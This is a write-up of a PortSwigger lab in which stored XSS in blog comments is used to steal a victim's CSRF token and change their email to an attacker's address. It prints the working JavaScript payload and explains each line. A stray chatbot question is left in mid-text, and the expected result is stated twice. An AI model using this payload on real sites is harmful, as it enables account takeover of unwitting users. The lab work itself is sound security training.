**üóìÔ∏è Solution Date:** 23 / 5 / 2025  
**üîó Lab Link:** [Exploiting XSS to bypass CSRF defenses](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)  
**üß® Vulnerability Type:** Stored XSS  

---

## 1Ô∏è‚É£ Introduction

In this lab, there is a **Stored XSS** vulnerability in the blog comment system. This vulnerability can be exploited to inject JavaScript code that steals the victim's **CSRF Token** when they open the page, then uses this token to send a **POST** request to change their email address without their knowledge.

---

### üë§ Test Login Credentials:
- **Username:** `wiener`
- **Password:** `peter`

---

### üí° Important Notes:
- You cannot use an already registered email.
- When testing on your account, use a random dummy email.
- In the actual attack, ensure you use an unused email address.
- Tools like **Burp Suite** are useful for capturing and analyzing requests.
- Ensure the XSS code works as soon as the victim opens the comments page.

---

## 2Ô∏è‚É£ Practical Testing

I tested changing the email from my account and monitored the resulting request, which contained the new email along with the CSRF token as shown in the following image:

> ![Pasted image](../images/image%205.png)

Based on this, I exploited the XSS vulnerability so that automatically, when any user (like admin) visits the comments page, their CSRF token is stolen and a request is submitted to change their email to the attacker's account.

---

## 3Ô∏è‚É£ Payload Used

```html
<script>
window.addEventListener('DOMContentLoaded', function() {
  let tokenElem = document.getElementsByName('csrf')[0].value;
  fetch('my-account/change-email', {
    method: 'POST',
    mode: 'no-cors',
    body: 'email=attacker@gmail.com&csrf=' + tokenElem,
  });
});
</script>
```

---

## 4Ô∏è‚É£ Payload Explanation Step by Step

1. **`<script>`**  
    The code starts as an HTML script element injected into a comment (through the XSS vulnerability).
    
2. **`window.addEventListener('DOMContentLoaded', function() { ... });`**  
    This line ensures the code won't execute until the page is fully loaded (after DOM elements are loaded).
    
3. **`let tokenElem = document.getElementsByName('csrf')[0].value;`**  
    This line searches for an element in the page with the name (name="csrf"), assuming it's an `<input>` element containing the **CSRF token**.  
    The value is extracted and stored in the `tokenElem` variable.
    
4. **`fetch('my-account/change-email', { ... })`**  
    This line executes an HTTP request of type `POST` to the email change path (`my-account/change-email`) within the same site.
    
    #### Parameters:
    
    - **`method: 'POST'`**  
        Because changing email requires a POST request.
        
    - **`mode: 'no-cors'`**  
        This prevents the browser from blocking the request due to **CORS** policy. However, it also prevents the browser from allowing you to read the response (which doesn't matter here as the attack is "blind").
        
    - **`body: 'email=attacker@gmail.com&csrf=' + tokenElem`**  
        The request body contains the required data for changing the email:
        
        - `email=attacker@gmail.com`: The new address to change to.
            
        - `csrf=...`: The protection token extracted from the page.
            

---

### üéØ Expected Result:

As soon as the victim (e.g., site administrator) visits the comments page containing this code, the request to change their email to `attacker@gmail.com` is automatically executed without their knowledge, unless there are additional protections like CSP or strict SameSite Cookies.

---

Would you like me to modify the code to include proper header formatting (Content-Type)?
---

## 5Ô∏è‚É£ Expected Result

Once the victim visits a page containing this comment, a request to change their email to `attacker@gmail.com` is automatically sent using their CSRF token, without any direct intervention from them.

‚úÖ The attack was successfully executed in the lab environment, ensuring all conditions were met to bypass protection mechanisms.
